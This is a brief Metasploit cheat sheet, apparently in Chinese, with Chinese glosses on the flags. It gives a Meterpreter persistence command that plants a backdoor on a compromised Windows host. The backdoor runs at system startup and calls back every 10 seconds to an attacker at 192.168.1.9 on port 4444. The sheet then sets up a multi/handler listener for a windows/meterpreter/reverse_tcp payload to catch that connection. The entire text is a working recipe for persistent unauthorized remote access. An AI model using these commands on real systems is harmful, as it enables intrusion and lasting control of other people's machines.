	Meterpreter>run persistence -X -i 10 -r 192.168.1.9 -p 4444
	-X系统启动时运行
	-i每隔10秒尝试连接服务端
	连接后门
	Msf>use exploit/multi/handler
	Msf>set payload windows/meterpreter/reverse_tcp
	Msf>set lhost 192.168.1.1
	Msf>set lport 4444
	Msf>run